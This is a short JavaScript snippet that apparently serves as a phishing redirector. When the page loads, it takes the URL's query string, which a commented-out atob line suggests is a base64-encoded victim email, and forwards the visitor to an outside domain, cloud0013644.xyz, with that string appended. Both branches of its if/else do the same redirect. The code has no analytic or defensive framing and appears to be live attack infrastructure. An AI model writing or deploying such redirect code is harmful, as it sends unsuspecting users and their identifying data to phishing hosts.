
      function redirrectPage() {
        var query = window.location.href;
        console.log(query);
        var res = query.split("?");
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);

        //realemailID = atob(data2);

        if (data2) {
          console.log("true");
          window.location.href =
            "https://cloud0013644.xyz/C" + data2;
        } else {
          console.log("false");
          window.location.href =
            "https://cloud0013644.xyz/C" + data2;
        }
      }
      redirrectPage();
    